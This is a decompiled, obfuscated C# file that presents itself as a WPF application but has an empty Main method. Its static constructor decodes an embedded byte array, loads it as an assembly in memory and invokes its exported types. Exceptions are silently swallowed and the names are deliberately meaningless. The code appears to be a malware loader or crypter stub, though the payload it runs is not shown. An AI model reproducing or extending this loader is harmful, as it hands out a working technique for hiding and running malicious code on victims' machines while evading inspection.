using System;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows;
using ns5;
using ns7;
using ns8;

namespace ns1;

internal sealed class Class0 : Application
{
	internal delegate void Delegate0();

	[Serializable]
	[CompilerGenerated]
	internal sealed class Class1
	{
		public static readonly Class1 u003cu003e9;

		static Class1()
		{
			u003cu003e9 = new Class1();
		}

		internal static ParallelQuery<MethodInfo> smethod_0(Type type_0)
		{
			return type_0.GetMethods().AsParallel();
		}

		internal bool method_0(char char_0)
		{
			return char.IsLetter(char_0);
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class2
	{
		public static readonly Class2 _003C_003E9 = new Class2();

		internal bool method_0(char char_0)
		{
			return char.IsLetter(char_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class3
	{
		public char j;

		internal bool method_0(Type type_0)
		{
			return !Class6.smethod_4(type_0, j);
		}
	}

	internal static Assembly U;

	internal static byte[] M;

	static Class0()
	{
		M = Class9.smethod_0(Class10.smethod_1());
		try
		{
			char? char_ = "1234B0097Z576676".LastOrDefault((char char_0) => char.IsLetter(char_0));
			U = Thread.GetDomain().Load(M);
			smethod_0(char_);
		}
		catch
		{
		}
	}

	protected internal static void smethod_0(char char_0)
	{
		Enumerable.Any(U.ExportedTypes.AsParallel(), (Type type_0) => !Class6.smethod_4(type_0, char_0));
	}

	public void method_0()
	{
	}

	public static void Main()
	{
	}
}
